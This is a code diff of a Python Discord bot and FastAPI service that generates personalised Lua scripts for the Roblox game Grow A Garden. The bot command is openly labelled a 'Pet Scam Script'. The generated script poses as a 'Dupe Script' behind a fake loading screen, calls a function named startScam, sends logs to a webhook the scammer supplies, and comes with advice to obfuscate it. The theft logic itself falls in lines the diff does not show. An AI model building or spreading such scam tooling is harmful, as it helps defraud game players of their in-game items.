@@ -1,32 +1,19 @@
+import os
+import io
 import discord
 from discord import app_commands
 from discord.ext import commands
-import io
-import os
+from fastapi import FastAPI, Request
+from fastapi.responses import JSONResponse, HTMLResponse
+from fastapi.staticfiles import StaticFiles
+import uvicorn
+import threading
 
-GUILD_ID = 1381683743789682718  # Replace with your guild/server ID (int)
+GUILD_ID = 1381683743789682718  # Your guild ID here
 
-intents = discord.Intents.default()
-bot = commands.Bot(command_prefix="/", intents=intents)
-
-@bot.event
-async def on_ready():
-    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
-    try:
-        guild = discord.Object(id=GUILD_ID)
-        synced = await bot.tree.sync(guild=guild)
-        print(f"Synced {len(synced)} commands to guild ID {GUILD_ID}")
-    except Exception as e:
-        print(f"Error syncing commands: {e}")
-
-@bot.tree.command(name="generatescript_garden", description="Generate Grow A Garden Pet Scam Script (OP)")
-@app_commands.describe(username="Your Roblox username", webhook="Webhook URL to send logs")
-@app_commands.guilds(discord.Object(id=GUILD_ID))
-async def generatescript_garden(interaction: discord.Interaction, username: str, webhook: str):
-    await interaction.response.defer(ephemeral=True)
-    
-    script = f'''-- GROW A GARDEN SCRIPT
--- OBFUSCATE IT AT [https://luaobfuscator.com/]
+# Lua script template with placeholders for username/webhook
+LUA_TEMPLATE = '''-- GROW A GARDEN SCRIPT
+-- OBFUSCATE IT AT [https://discord.gg/79FmBBqvx8]
 local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
 local StarterGui = game:GetService("StarterGui")
@@ -80,7 +67,7 @@ bar.BorderSizePixel = 0
 local label = Instance.new("TextLabel", bg)
 label.Size = UDim2.new(1, 0, 0, 80)
 label.Position = UDim2.new(0, 0, 0.4, -30)
-label.Text = "🌱 Grow A Garden Dupe Script- Initializing..."
+label.Text = "🌱 Grow A Garden Dupe Script - Initializing..."
 label.TextColor3 = Color3.new(0, 1, 0)
 label.Font = Enum.Font.GothamBlack
 label.TextSize = 32
@@ -95,7 +82,7 @@ local function animateLoading(callback)
             percent = percent + math.random(1, 2)
             if percent > 100 then percent = 100 end
             label.Text = ("🌱 Loading... %d%%"):format(percent)
-            TweenService:Create(bar, TweenInfo.new(0.3), {{Size = UDim2.new(percent/100, 0, 0, 50)}}):Play()
+            TweenService:Create(bar, TweenInfo.new(1), {{Size = UDim2.new(percent/100, 0, 0, 50)}}):Play()
             task.wait(math.random(5, 15)/50)
         end
 
@@ -218,6 +205,29 @@ end
 animateLoading(startScam)
 '''
 
+# --- Discord bot setup ---
+
+intents = discord.Intents.default()
+bot = commands.Bot(command_prefix="/", intents=intents)
+app = FastAPI()
+
+@bot.event
+async def on_ready():
+    print(f"Discord bot logged in as {bot.user} (ID: {bot.user.id})")
+    try:
+        guild = discord.Object(id=GUILD_ID)
+        synced = await bot.tree.sync(guild=guild)
+        print(f"Synced {len(synced)} commands to guild ID {GUILD_ID}")
+    except Exception as e:
+        print(f"Error syncing commands: {e}")
+
+@bot.tree.command(name="generatescript_garden", description="Generate Grow A Garden Pet Scam Script (OP)")
+@app_commands.describe(username="Your Roblox username", webhook="Webhook URL to send logs")
+@app_commands.guilds(discord.Object(id=GUILD_ID))
+async def generatescript_garden(interaction: discord.Interaction, username: str, webhook: str):
+    await interaction.response.defer(ephemeral=True)
+
+    script = LUA_TEMPLATE.replace("{username}", username).replace("{webhook}", webhook)
     file = discord.File(io.StringIO(script), filename=f"GrowAGardenScam_{username}.lua")
 
     try:
@@ -226,9 +236,38 @@ animateLoading(startScam)
     except discord.Forbidden:
         await interaction.followup.send("Can't DM you. Check your privacy settings.", ephemeral=True)
 
-# Run the bot with your token from GitHub secrets
-token = os.getenv("DISCORD_TOKEN")
-if not token:
-    print("ERROR: DISCORD_TOKEN environment variable not found!")
-else:
+# --- FastAPI endpoints ---
+
+# Serve static files (HTML, CSS, JS) from ./static folder
+app.mount("/static", StaticFiles(directory="static"), name="static")
+
+@app.get("/", response_class=HTMLResponse)
+async def root():
+    # Serve the index.html from static folder
+    with open("static/index.html", "r", encoding="utf-8") as f:
+        return f.read()
+
+@app.get("/api/generate_script")
+async def generate_script(username: str, webhook: str):
+    # Return the Lua script filled with parameters as JSON
+    script = LUA_TEMPLATE.replace("{username}", username).replace("{webhook}", webhook)
+    return JSONResponse({"script": script})
+
+# --- Run both FastAPI and Discord bot concurrently ---
+
+def start_discord_bot():
+    token = os.getenv("DISCORD_TOKEN")
+    if not token:
+        print("ERROR: DISCORD_TOKEN environment variable not found!")
+        return
     bot.run(token)
+
+def start_api():
+    uvicorn.run(app, host="0.0.0.0", port=8000)
+
+if __name__ == "__main__":
+    # Run API and bot in parallel threads
+    import threading
+
+    threading.Thread(target=start_api).start()
+    threading.Thread(target=start_discord_bot).start()
